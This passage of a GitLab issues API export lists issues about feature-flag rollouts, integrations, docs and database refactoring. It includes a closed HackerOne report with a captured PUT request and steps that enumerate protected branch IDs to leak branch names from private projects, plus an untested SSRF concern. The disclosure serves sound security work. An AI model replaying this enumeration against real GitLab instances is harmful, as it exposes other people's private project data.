Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"}],"author":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"type":"ISSUE","assignee":{"id":1674572,"username":"adamcohen","name":"Adam Cohen","state":"active","avatar_url":"https://secure.gravatar.com/avatar/68fe8da9d9dfc88d0d150808cd364825?s=80\u0026d=identicon","web_url":"https://gitlab.com/adamcohen"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/338232","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":2},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/338232","notes":"https://gitlab.com/api/v4/projects/278964/issues/338232/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/338232/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#338232","relative":"#338232","full":"gitlab-org/gitlab#338232"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91814423,"iid":338231,"project_id":278964,"title":"Geo 2.0 Regression - Removing Primary Nodes in the UI","description":"## What/Why\n\nIn Geo, you should be able to remove the Primary Node if there are no other secondary nodes.

Posting the QA result in this issue is preferable.\n\n### Preparation before production rollout\n\n- [ ] Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] If the feature might impact the user experience, notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n- [ ] If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), enable it on GitLab.com for [testing groups/projects](#testing-groupsprojectsusers).\n    - [ ] `/chatops run feature set --\u003cactor-type\u003e=\u003cactor\u003e \u003cfeature-flag-name\u003e true`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Global rollout on production\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2021-08-11T08:50:03.450Z","updated_at":"2021-10-28T13:53:51.694Z","closed_at":"2021-08-11T09:07:03.018Z","closed_by":{"id":5249152,"username":"vij","name":"Vijay

announcement](https://community.developer.atlassian.com/t/action-required-atlassian-connect-installation-lifecycle-security-improvements/49046) that requires your attention. There is no additional action required if you have already updated your apps to comply with our change to the install/uninstall lifecycle authentication.\n\nAtlassian is making a breaking change to Atlassian Connect app install and uninstall lifecycle events in Jira and Confluence Cloud to improve the security of the Connect framework. In the install and uninstall callback requests sent by Atlassian to your app, the Authorization JWT token will be signed asymmetrically so that apps can verify that the request is genuine. Atlassian is planning to enforce asymmetric JWTs to all apps' install/uninstall lifecycle events by Oct 29, 2021.\n\nPlease review your apps and apply the required mitigations.\n\nIs my app impacted?\n\n- If your app uses an [authentication descriptor setting](https://developer.atlassian.com/cloud/jira/platform/connect-app-descriptor) other than none, then your app is impacted and will need to be updated.\n- This vulnerability affects apps regardless of how they are installed; apps listed on the Marketplace and apps installed via the UPM \"dev mode\" are affected.\n- Apps running on Bitbucket Connect are not affected.\n\nAction Required\n\n1. As soon as possible, [follow the instructions](https://community.developer.atlassian.com/t/action-required-atlassian-connect-installation-lifecycle-security-improvements/49046) to ensure your app has opted-in to signed install and is compliant with these changes, whether you are running an Atlassian-supported Connect framework or a custom implementation.\n1. If you are no longer supporting an app that is impacted, we recommend that you contact Marketplace Support to have your app un-installed from all sites and de-listed from the Marketplace.\n\nFor more information on the timeline of the breaking change and for additional questions, please see review the [announcement on the Developer Community](https://community.developer.atlassian.com/t/action-required-atlassian-connect-installation-lifecycle-security-improvements/49046).","state":"closed","created_at":"2021-08-11T03:59:55.637Z","updated_at":"2022-11-22T19:36:02.367Z","closed_at":"2021-10-11T10:17:22.818Z","closed_by":{"id":1315742,"username":"arturoherrero","name":"Arturo Herrero","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1315742/avatar.png","web_url":"https://gitlab.com/arturoherrero"},"labels":["Deliverable","Integration::Jira","Jira::ConnectApp","auto updated","backend","devops::manage","group::integrations","priority::1","section::dev","severity::1","type::maintenance","workflow::production"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":16943,"username":"Andysoiron","name":"Andy Soiron","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/16943/avatar.png","web_url":"https://gitlab.com/Andysoiron"}],"author":{"id":2880930,"username":"engwan","name":"Heinrich Lee Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"},"type":"ISSUE","assignee":{"id":16943,"username":"Andysoiron","name":"Andy Soiron","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/16943/avatar.png","web_url":"https://gitlab.com/Andysoiron"},"user_notes_count":29,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2021-10-22","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/338177","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/338177","notes":"https://gitlab.com/api/v4/projects/278964/issues/338177/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/338177/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#338177","relative":"#338177","full":"gitlab-org/gitlab#338177"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91779844,"iid":338176,"project_id":278964,"title":"Add language version to Dependency Scanning docs","description":"### Problem to solve \n\nThe purpose of this issue is to update the [Supported languages and package managers](https://docs.gitlab.com/ee/user/application_security/dependency_scanning/index.html#supported-languages-and-package-managers) table to include a new column \"Language Version\", which will document the supported versions for each language.

If you just replace IDs of branches, you can [~~set~~](https://gitlab.com/gitlab-org/gitlab/-/issues/338062#note_666692973)/get their name even if they are belong to private project where you don't have any access. The IDs are sequential so you can easily obtain the names in bulk.\n\n\n\n#####  Steps to reproduce\n\n1. Login as a maintainer in your project and go to `https://gitlab.com/\u003cGroupName\u003e/\u003cProjectName\u003e/edit` in `Merge Request` section , click on `Add Status Check` button.\n\n2. Add your inputs.(allows adding localhost urls too . I am bringing this to your attention as normally gitlab wont allow localhost urls). select your branch in branch dropdown and add. Capture the request like below.\n\n```  \nPUT /api/v4/projects/23887195/external_status_checks/50 HTTP/2  \nHost: gitlab.com  \nCookie: 1  \nContent-Length: 120  \nSec-Ch-Ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"  \nAccept: application/json, text/plain, */*  \nX-Csrf-Token: 1  \nX-Requested-With: XMLHttpRequest  \nSec-Ch-Ua-Mobile: ?0  \nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36  \nContent-Type: application/json;charset=UTF-8  \nOrigin: https://gitlab.com  \nSec-Fetch-Site: same-origin  \nSec-Fetch-Mode: cors  \nSec-Fetch-Dest: empty  \nReferer: https://gitlab.com/privategroup4321/githubimport/edit  \nAccept-Encoding: gzip, deflate  \nAccept-Language: en-US,en;q=0.9  \nConnection: close\n\n{\"external_url\":\"http://127.0.0.1/\",\"id\":50,\"name\":\"Anything\",\"protected_branch_ids\":[41438448]}  \n```\n\n3. just replace the value of `protected_branch_ids` in above request to any protected branch ID that may belong to private project that you dont have access to. these IDs are sequential.\n\n4. Send the request and you can see the protected branch name in response as well as UI.\n\n5. This way you can obtain protected branch names of any project irrespective their visibilities!\n\n\n#####  What is the current *bug* behavior?\n\nAble to fetch protected branch names of private projects and create a status check using those.\n\n#####  What is the expected *correct* behavior?\n\nOnly branches belong to the projects should be added in status check.\n\n\n#####  Output of checks\n\nThis bug happens on GitLab.com `GitLab Enterprise Edition 14.2.0-pre 62864aa6970 `\n\nAs mentioned above, this feature is not yet available in local installations. \n\nRegards,  \nAshish\n\n####  Impact\n\nAble to fetch protected branch names of private projects and create a status check using those.\n\nThe request also takes URL as an input and it allows adding localhost urls such as `http://127.0.0.1` . I am currently not sure about this wether this is  vulnerable to Blind SSRF as this feature is not available on local installations yet. The request of this URL is sent when merge request is updated.\n\n I would have checked for SSRF too if the feature was available on local but I will update about this later whenever the feature is available on local installation and if its vulnerable to blind ssrf.\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues","state":"closed","created_at":"2021-08-10T14:57:49.289Z","updated_at":"2021-12-21T00:05:00.840Z","closed_at":"2021-09-30T08:51:18.779Z","closed_by":{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"},"labels":["Category:Authentication and Authorization","HackerOne","Weakness::CWE-639","auto updated","devops::manage","group::compliance","priority::1","reproduced on GitLab.com","section::dev","security","severity::3","workflow::verification"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":5833976,"username":"mwoolf","name":"Max Woolf","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4c8af02fcb6678db41bd8d3a29f9c1d8?s=80\u0026d=identicon","web_url":"https://gitlab.com/mwoolf"},"user_notes_count":32,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2021-09-10","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/338062","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/338062","notes":"https://gitlab.com/api/v4/projects/278964/issues/338062/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/338062/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#338062","relative":"#338062","full":"gitlab-org/gitlab#338062"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91743471,"iid":338043,"project_id":278964,"title":"Update approvals API for consistency across group and project endpoints","description":"## Problem to solve\n\nThe ~frontend team has [noted](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67316#note_641586110) that group approvals deviates from the existing [project API](https://docs.gitlab.com/ee/api/merge_request_approvals.html#project-level-mr-approvals).

Posting the QA result in this issue is preferable.\n\n### Preparation before production rollout\n\n- [ ] Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] If the feature might impact the user experience, notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n- [ ] If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), enable it on GitLab.com for [testing groups/projects](#testing-groupsprojectsusers).\n    - [ ] `/chatops run feature set --\u003cactor-type\u003e=\u003cactor\u003e \u003cfeature-flag-name\u003e true`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Global rollout on production\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `\u003cfeature-flag-name\u003e`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [x] Create a merge request to remove `\u003cfeature-flag-name\u003e` feature flag. Ask for review and merge it.\n    - [x] Remove all references to the feature flag from the codebase.\n    - [x] Remove the YAML definitions for the feature from the repository.\n    - [x] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --dev`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e --staging`\n    - [ ] `/chatops run feature delete \u003cfeature-flag-name\u003e`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set \u003cfeature-flag-name\u003e false\n```","state":"closed","created_at":"2021-08-10T09:32:43.571Z","updated_at":"2021-10-28T13:54:08.579Z","closed_at":"2021-10-18T11:46:08.184Z","closed_by":{"id":3860200,"username":"egrieff","name":"Eugenia Grieff","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3860200/avatar.png","web_url":"https://gitlab.com/egrieff"},"labels":["Deliverable","[deprecated] Accepting merge requests","auto updated","backend","devops::plan","documentation","feature flag","group::product planning","section::dev","tw-weight::3","type::maintenance","workflow::ready for development"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[],"author":{"id":4418630,"username":"johnhope","name":"John Hope","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4418630/avatar.png","web_url":"https://gitlab.com/johnhope"},"type":"ISSUE","assignee":null,"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/338038","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":47,"completed_count":4},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 47 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/338038","notes":"https://gitlab.com/api/v4/projects/278964/issues/338038/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/338038/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#338038","relative":"#338038","full":"gitlab-org/gitlab#338038"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91716533,"iid":338018,"project_id":278964,"title":"Add a `ref` argument to `ProjectPipelineResolver`","description":"Per `@lauraX` in https://gitlab.com/gitlab-org/gitlab/-/issues/24059#note_646598729, this is the ~backend issue splitting off from https://gitlab.com/gitlab-org/gitlab/-/issues/24059\n\n\u003e I would re-weight this as a a ~\"backend-weight::2\" - we need to add a `ref` argument to the `ProjectPipelineResolver` to send the appropriate data to the frontend","state":"closed","created_at":"2021-08-10T01:11:19.965Z","updated_at":"2022-06-23T01:35:19.816Z","closed_at":"2022-06-22T19:28:06.746Z","closed_by":{"id":4512666,"username":"jheimbuck_gl","name":"James Heimbuck","state":"active","avatar_url":"https://secure.gravatar.com/avatar/8dd2ef9c1cacb6e80d7ca47db6f0ce22?s=80\u0026d=identicon","web_url":"https://gitlab.com/jheimbuck_gl"},"labels":["Category:Continuous Integration","Seeking community contributions","[deprecated] Accepting merge requests","approaching-SLO","backend","devops::verify","group::pipeline execution","merge requests","missed-SLO","priority::2","quad-planning::complete-no-action","section::ops","severity::2","type::bug","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now.

dashboards Environment#last_visible_pipeline last_visible_deployable last_deployable","description":"## Summary\n\nCode used in environments dashboard pages is causing problems with moving `ci_*` tables to a new database (ie. the current ~\"group::sharding\" decomposition efforts).\n\n## Technical details\n\nThe following `has_one` relations from https://gitlab.com/gitlab-org/gitlab/-/blob/ee956e0dfc4f2e37f4f37fc63b50c3f50376195a/app/models/environment.rb#L30 do cross-joins between `ci_*` and non `ci_*` tables:\n\n```rb\nhas_one :last_deployable, through: :last_deployment, source: 'deployable', source_type: 'CommitStatus'\nhas_one :last_visible_deployable, through: :last_visible_deployment, source: 'deployable', source_type: 'CommitStatus'\nhas_one :last_visible_pipeline, through: :last_visible_deployable, source: 'pipeline'\n```\n\nThese methods are used in a few places but the main tricky part to solve is using them as preload in [`Dashboard::Environments::ListService`](https://gitlab.com/gitlab-org/gitlab/-/blob/ee956e0dfc4f2e37f4f37fc63b50c3f50376195a/ee/app/services/dashboard/environments/list_service.rb#L27).\n\nThe `last_visible_pipeline` chains together all the others.\n\n## Possible solutions\n\nI started testing different approaches at https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67834 but it turned out to be a bit trickier than expected so we want to distribute this work to relevant team so that they can \n\n1. Similar to https://gitlab.com/gitlab-org/gitlab/-/merge_requests/66709 we can add `disable_joins` to these but my initial testing of this did not seem to work out of the box due to the interesting way these construct results using scopes and `distinct`. We could look into whether this is a bug in `disable_joins` that's easily fixed but I fear there may be technically something strange about these `has_one` relations being used in a way this feature was not intended\n2. In https://gitlab.com/gitlab-org/gitlab/-/merge_requests/67834 I also tried extracting all these `has_one` as a method but I realised later that this won't work with the preload. But it could be possible to write the preloading logic more directly for these relations and still avoid using `has_one` for this.\n\nYou can read more about typical solutions to these types of join problems at https://docs.gitlab.com/ee/development/database/multiple_databases.html#removing-joins-between-ci_-and-non-ci_-tables . It may turn out there is a simpler way to refactor this code that doesn't rely on these `has_one` or joins.","state":"closed","created_at":"2021-08-09T23:37:33.206Z","updated_at":"2021-10-12T10:28:45.549Z","closed_at":"2021-09-17T09:22:03.906Z","closed_by":{"id":9253328,"username":"bala.kumar","name":"Bala

The last section \"Release notes\" can be used as a summary of the feature and is also required if you want to have your release post blog MR auto generated using the release post item generator:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator. The remaining sections are the backbone for every feature in GitLab. --\u003e\n\nAfter adding https://gitlab.com/gitlab-org/gitlab/-/issues/335459, user's selected timezone is now presented in the user profile. It would be nice to see this on the snapshot as well\n\n\n\n### Release notes \n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\nYou can now see your local timezone on the snapshot view of a user profile when you hover over someone's name on an issue or merge request. This helps users better understand when to expect responses from you directly from comments using the without needing to navigate to the user's profile and increases team collaboration. \n\n### Problem to solve \n\n\u003c!-- What is the user problem you are trying to solve with this issue? --\u003e\n\nUser timezone is  only reflected on the profile page amd should be reflected everywhere throughout GitLab\n\n### Proposal \n\n\u003c!-- Use this section to explain the feature and how it will work.

